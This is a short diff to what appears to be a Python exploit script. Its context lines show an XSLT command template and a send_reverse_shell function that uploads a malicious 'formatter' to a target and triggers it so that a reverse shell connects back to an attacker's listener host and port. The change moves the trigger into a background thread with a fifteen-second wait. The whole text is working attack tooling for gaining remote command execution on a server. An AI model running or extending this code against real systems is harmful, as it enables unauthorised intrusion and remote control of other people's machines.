@@ -43,6 +43,7 @@ import random
 import string
 import re
 from urllib.parse import urljoin
+import threading
 
 
 XSLT_CMD_TEMPLATE = """\
@@ -228,7 +229,9 @@ def send_reverse_shell(session, base_url, token, uuid, lhost, lport):
         return
     print(f"[*] Formatter uploaded: {name}")
     print(f"[*] Triggering... listener should be ready on port {lport}")
-    trigger_formatter(session, base_url, uuid, name)
+    t = threading.Thread(target=trigger_formatter, args=(session, base_url, uuid, name), daemon=True)
+    t.start()
+    import time; time.sleep(15)
 
 
 def banner():
